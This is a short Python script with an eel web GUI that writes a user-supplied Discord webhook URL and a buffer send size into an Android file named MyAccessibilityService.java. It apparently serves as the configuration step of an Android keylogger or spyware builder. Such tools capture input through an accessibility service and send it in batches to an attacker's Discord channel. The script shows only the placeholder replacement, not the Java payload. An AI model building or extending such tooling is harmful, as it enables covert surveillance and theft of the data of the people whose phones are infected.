import os
import eel

eel.init('web')

@eel.expose
def update_message(new_message):
    # Logic to update message on the HTML side
    print(new_message)  # For testing, replace with actual logic to update HTML

@eel.expose
def replace_values(webhook_token, buffer_send_size=None):
    update_message("Replacing values...")

    java_file_path = "app/src/main/java/com/MyAccessibilityService.java"
    if os.path.exists(java_file_path):
        with open(java_file_path, "r") as f:
            content = f.read()

        # Replace Webhook Bot Token
        content = content.replace("INSERT-WEBHOOK-URL-FROM-YOUR-CHANNEL-BOT", webhook_token)

        # Replace Buffer Send Size if provided
        if buffer_send_size is not None:
            content = content.replace("Buffer-Send-Size-UpdateME", buffer_send_size)

        with open(java_file_path, "w") as f:
            f.write(content)

        update_message("Updated placeholders in Java file.")
    else:
        update_message("Error: Java file not found.")

eel.start('Discord.html', size=(600, 400), port=9449)
